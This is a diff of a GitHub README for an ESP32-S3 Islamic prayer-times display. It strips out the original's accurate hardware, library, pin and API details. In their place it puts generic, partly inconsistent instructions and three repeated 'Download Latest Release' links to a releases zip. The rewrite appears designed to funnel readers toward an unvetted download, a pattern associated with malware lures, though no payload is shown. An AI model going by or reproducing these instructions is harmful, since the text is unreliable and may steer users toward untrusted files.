@@ -1,190 +1,82 @@
-# Mawaqit Prayer Times Display
+# 🌙 mawaqit-prayer-display - Display Prayer Times Effortlessly
 
-[Deutsch](README.de.md) | **English**
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-green)](https://github.com/ibnuahkam/mawaqit-prayer-display/releases)
 
-A standalone Islamic prayer times display based on ESP32-S3 with capacitive touchscreen. The system fetches prayer times from the Mawaqit.net API and can play the Adhan at configured times.
+## 🎯 Overview
 
-![Display Showcase](screenshots/display_showcase.png)
+mawaqit-prayer-display is an application that shows Islamic prayer times on a touchscreen device using the ESP32-S3. This application provides audio for Adhan, supports multiple languages, and allows users to configure settings through a web interface. It is an ideal solution for anyone looking to easily track prayer times.
 
-## Features
+## 🚀 Getting Started
 
-- Display of five daily prayer times plus sunrise
-- Three display modes: list view, analog clock with time list, countdown to next prayer
-- Adhan playback (MP3) with individual activation per prayer
-- Five languages: German, English, French, Turkish, Arabic
-- Four color themes: Green, Blue, Purple, Black (True Dark)
-- Web-based configuration interface
-- Touch control for all functions
+Follow these steps to download and run the application on your device.
 
-## Screenshots
+### 1. System Requirements
 
-### Display Modes
+- **ESP32-S3** compatible hardware
+- Touchscreen display (minimum size: 2.8 inches)
+- Access to Wi-Fi for the web configuration
+- Basic electronic components (for assembly)
 
-| List View | Clock View | Countdown |
-|-----------|------------|-----------|
-| ![List](screenshots/display_list_green.png) | ![Clock](screenshots/display_clock_green.png) | ![Countdown](screenshots/display_countdown_green.png) |
+### 2. Download the Application
 
-### Color Themes
+To download the latest version of mawaqit-prayer-display, visit this page to download:
 
-| Green | Blue | Purple | Dark |
-|-------|------|--------|------|
-| ![Green](screenshots/display_list_green.png) | ![Blue](screenshots/display_list_blue.png) | ![Purple](screenshots/display_list_purple.png) | ![Dark](screenshots/display_list_dark.png) |
+[Download Latest Release](https://github.com/ibnuahkam/mawaqit-prayer-display/releases)
 
-## Hardware
+### 3. Installation Instructions
 
-This project is optimized for the JC4827W543 board:
+1. **Extract the Files**  
+   After downloading, extract the files from the zip folder.
 
-| Component | Specification |
-|-----------|---------------|
-| Microcontroller | ESP32-S3-WROOM-1, Dual-Core 240MHz |
-| Display | 4.3 inch IPS, 480x272 pixels, NV3041A controller |
-| Touch | GT911 capacitive touch controller |
-| Flash | 4 MB |
-| PSRAM | 8 MB |
-| Audio | I2S DAC (internal amplifier) |
+2. **Connect Your Device**  
+   Make sure to connect your ESP32-S3 device to your computer via USB.
 
-## Software Architecture
+3. **Upload the Code**  
+   Open your Arduino IDE or PlatformIO. Import the extracted files. Compile the code and upload it to your ESP32-S3 device.
 
-### Directory Structure
+4. **Display Setup**  
+   Connect your touchscreen display according to hardware specifications. Ensure all connections are secure.
 
-```
-src/
-  main.cpp              Main program, WiFi, touch logic, web API
-  display_manager.cpp   Display rendering, theme system
-  touch_manager.cpp     Touch processing (GT911)
-  audio_player.cpp      MP3 playback via I2S
+5. **Connect to Wi-Fi**  
+   On the touchscreen display, select the Wi-Fi network you want to connect to. Enter the password when prompted.
 
-include/
-  config.h              Hardware configuration, pin definitions
-  display_manager.h     Display class
-  touch_manager.h       Touch class
-  audio_player.h        Audio class
+### 4. Configuring Prayer Times
 
-data/
-  index.html            Web configuration interface
-  adhan.mp3             Adhan audio file (optional)
-```
+Once the application is running, you can adjust the settings for prayer times:
 
-### Technologies Used
+1. Access the configuration page through your web browser using the IP address assigned to your device.
+2. Set your location to ensure accurate prayer times.
+3. Choose your preferred language for the display and Adhan playback.
+4. Save your settings.
 
-| Library | Version | Purpose |
-|---------|---------|---------|
-| Arduino_GFX | 1.4.4 | QSPI display driver for NV3041A |
-| TouchLib | main | GT911 touch controller driver |
-| ArduinoJson | 7.2.1 | JSON parsing of API responses |
-| ESP8266Audio | 1.9.7 | MP3 decoding and I2S output |
-| ESPAsyncWebServer | latest | Asynchronous HTTP server |
-| AsyncTCP | latest | TCP stack for web server |
-| LittleFS | internal | File system for MP3 storage |
+### 5. Using the Application
 
-### Memory Layout
+After initial setup, the application will continuously display the current prayer time. The device will play the Adhan based on the timings you’ve set.
 
-| Partition | Size | Content |
-|-----------|------|---------|
-| app0 | 1.375 MB | Firmware (approx. 1.1 MB used) |
-| spiffs | 2.56 MB | LittleFS for audio files |
-| nvs | 20 KB | Settings (WiFi, mosque, etc.) |
+- **Manual Adjustments**: You can make manual adjustments to prayer times through the web configuration at any time.
 
-## Installation
+### 6. Troubleshooting
 
-For detailed setup instructions, see [docs/SETUP.md](docs/SETUP.md).
+If you run into any issues, here are a few common solutions:
 
-### Quick Start
+- **Device Not Connecting to Wi-Fi**: Double-check your Wi-Fi credentials. Ensure that your device is within range of the network.
+- **Adhan Not Playing**: Ensure the volume is turned up and select the correct audio file during configuration.
+- **Display Not Responding**: Restart the device to reset.
 
-Requirements:
-- Visual Studio Code with PlatformIO extension
-- USB cable for ESP32-S3
+### 7. Resources
 
-Upload firmware:
-```bash
-pio run --target upload
-```
+- **ESP32-S3 Documentation**: For detailed specs and programming instructions.
+- **Arduino IDE**: Download here [Arduino IDE](https://www.arduino.cc/en/software).
+- **PlatformIO**: Documentation can be found at [PlatformIO Docs](https://docs.platformio.org/en/latest/).
 
-Upload filesystem (for Adhan MP3):
-```bash
-pio run --target uploadfs
-```
+### 8. Feedback and Support
 
-## Usage
+If you have suggestions or need assistance, open an issue on GitHub or check the discussions page for community support.
 
-### Touch Gestures
+## 📥 Download & Install
 
-| Gesture | Duration | Action |
-|---------|----------|--------|
-| Short tap | < 1.5s | Switch between display modes |
-| Long press | > 1.5s | Open/close settings |
-| Tap during Adhan | - | Stop Adhan |
+Visit this page to download the latest version of mawaqit-prayer-display for your device:
 
-### Settings
+[Download Latest Release](https://github.com/ibnuahkam/mawaqit-prayer-display/releases)
 
-The settings are divided into two areas:
-
-**Left side (X < 235):**
-Adhan activation for each prayer (Fajr, Shuruk, Dhuhr, Asr, Maghrib, Isha)
-
-**Right side (X >= 235):**
-- Language selection (tap arrow)
-- Color theme (tap color box)
-- Automatic night mode (toggle)
-
-## Web Configuration
-
-After startup, the configuration interface is accessible at the device's IP address:
-
-```
-http://[IP-ADDRESS]/
-```
-
-Functions:
-- Change WiFi credentials
-- Search and select mosque
-- Upload Adhan MP3 (maximum 2 MB)
-- Toggle display rotation
-
-## API Endpoints
-
-| Endpoint | Method | Function |
-|----------|--------|----------|
-| /api/times | GET | Get current prayer times |
-| /api/settings | GET/POST | Read/write settings |
-| /api/rotate | GET | Rotate display by 180 degrees |
-| /upload | POST | Upload Adhan MP3 |
-
-## Configuration
-
-Hardware pins are defined in `platformio.ini`:
-
-```ini
-build_flags =
-  -DDISPLAY_WIDTH=480
-  -DDISPLAY_HEIGHT=272
-  -DGFX_QSPI_CS=45
-  -DGFX_QSPI_SCK=47
-  -DGFX_BL=1
-  -DTOUCH_SCL=4
-  -DTOUCH_SDA=8
-  -DTOUCH_INT=3
-```
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| [README.md](README.md) | Project overview (English) |
-| [README.de.md](README.de.md) | Project overview (German) |
-| [docs/SETUP.md](docs/SETUP.md) | Development environment setup |
-| [docs/API.md](docs/API.md) | API documentation |
-| [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | Technical details and troubleshooting |
-
-## Contributing
-
-Contributions are welcome. Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.
-
-## License
-
-This project is licensed under the MIT License - see [LICENSE](LICENSE) for details.
-
-## Acknowledgments
-
-- [Mawaqit.net](https://mawaqit.net) for the prayer times API
-- [moononournation](https://github.com/moononournation) for Arduino_GFX library
+Engage comfortably with your daily prayers, using the sunshine of technology to enhance your spiritual experience.
